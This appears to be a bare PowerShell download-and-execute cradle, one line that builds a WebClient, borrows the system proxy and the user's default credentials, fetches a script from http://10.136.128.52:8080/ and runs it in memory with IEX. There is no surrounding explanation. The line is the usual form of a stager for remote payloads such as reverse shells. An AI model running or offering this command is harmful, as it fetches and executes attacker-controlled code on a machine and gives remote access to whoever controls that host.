$J=new-object net.webclient;$J.proxy=[Net.WebRequest]::GetSystemWebProxy();$J.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $J.downloadstring('http://10.136.128.52:8080/');
